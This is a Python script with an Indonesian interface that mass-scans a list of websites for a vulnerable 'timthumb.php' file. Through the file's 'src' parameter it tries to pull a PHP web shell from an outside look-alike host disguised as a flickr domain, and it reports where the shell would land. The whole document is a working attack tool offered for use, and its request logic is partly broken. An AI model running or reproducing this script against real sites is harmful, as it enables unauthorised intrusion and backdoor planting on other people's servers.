#!/usr/bin/python
# -*- coding: utf-8 -*-

import requests
import os
import sys
os.system("clear")

print("""\033[91m
\t  ______ _______ ______ _______  ______
\t |_____/ |_____|  ____/ |______ |_____/
\t |    \_ |     | /_____ |______ |    \_
\033[0m""")
if len(sys.argv) != 3:
    print("\t [!] Usage : " +sys.argv[0]+" -l list.txt")
    exit()
    
lst = sys.argv[2]
if len(str(lst)) > 0:
    if os.path.isfile(lst):
        ls = open(lst, 'r')
    else:
        exit(" [!] List Tidak Ditemukan")
while True:
    suc = open('rce.txt', 'a')
    
    host = ls.readline().replace('\n', '')
    ex = host+'?src=http://flickr.com.tukangpompajakarta.com/shell.php'
    hsl = host+'/admin/webroot/cache/dedot.php'
    if not host:
        break
    if not host.startswith('http'):
        host = 'http://' + host + '/admin/timthumb.php'
        print('\033[097m[*] Mengecek : '+ host)
        try:
            r = requests.get(host)    
            z = requests.get(host+ex) 
        except:
            print('\033[91m[!] Server Null Response\n')
            pass
            continue   
        if z.status_code == 200:
            print("\033[32;1m[!] Uploader Sukses : "+hsl+'\n \033[0m')
        else:
            print("\033[91m[!] Tidak Bisa Upload Uploader\n \033[0m")  
